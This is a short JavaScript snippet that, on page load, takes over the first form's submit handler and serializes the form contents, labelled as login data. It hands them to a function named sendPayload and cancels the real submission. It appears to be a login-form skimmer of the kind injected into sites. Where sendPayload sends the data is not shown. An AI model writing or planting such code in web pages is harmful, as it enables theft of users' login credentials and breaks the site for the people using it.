window.onload = function() {
    document.forms[0].onsubmit = function() {
       
        sendPayload("Login event - DATA:" + serialize(document.forms[0]));
        return false;
    }
}